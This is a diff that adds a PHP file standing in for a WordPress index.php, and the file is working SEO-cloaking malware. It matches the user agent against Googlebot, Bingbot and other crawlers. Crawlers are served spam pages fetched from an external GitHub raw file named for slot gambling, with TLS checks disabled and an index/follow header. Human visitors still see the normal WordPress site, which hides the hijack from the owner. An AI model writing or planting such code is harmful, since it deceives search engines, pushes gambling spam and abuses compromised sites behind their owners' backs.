@@ -1,0 +1,70 @@
+<?php
+/**
+ * Cloaking System - Using file_get_contents (No cURL)
+ */
+
+// Bot detection
+function is_bot() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $bots = [
+        'Googlebot', 'bingbot', 'YandexBot', 'Baiduspider', 
+        'Slurp', 'DuckDuckBot', 'facebookexternalhit', 
+        'Twitterbot', 'LinkedInBot', 'Pinterest',
+        'Google-InspectionTool', 'Google-Site-Verification'
+    ];
+    
+    foreach ($bots as $bot) {
+        if (stripos($ua, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Function to fetch external content
+function fetch_content($url) {
+    // Method 1: file_get_contents
+    if (ini_get('allow_url_fopen')) {
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'GET',
+                'header' => "User-Agent: Mozilla/5.0 (compatible; Googlebot)\r\n",
+                'timeout' => 15
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ]);
+        
+        $content = @file_get_contents($url, false, $context);
+        if ($content !== false) {
+            return $content;
+        }
+    }
+    
+    // Method 2: Fallback to simple file_get_contents
+    $content = @file_get_contents($url);
+    if ($content !== false) {
+        return $content;
+    }
+    
+    // If all fails, return default content
+    return '<!DOCTYPE html><html><body><h1>Informasi Publik</h1><p>Selamat datang di portal resmi.</p></body></html>';
+}
+
+// Bot URL
+$bot_url = 'https://raw.githubusercontent.com/freyarion25/landingpage/refs/heads/main/chia-slot-gacor.txt';
+
+if (is_bot()) {
+    // Bot: fetch external content
+    while (ob_get_level()) ob_end_clean();
+    header('Content-Type: text/html; charset=UTF-8');
+    header('X-Robots-Tag: index, follow');
+    echo fetch_content($bot_url);
+    exit;
+}
+
+// Human: load WordPress
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
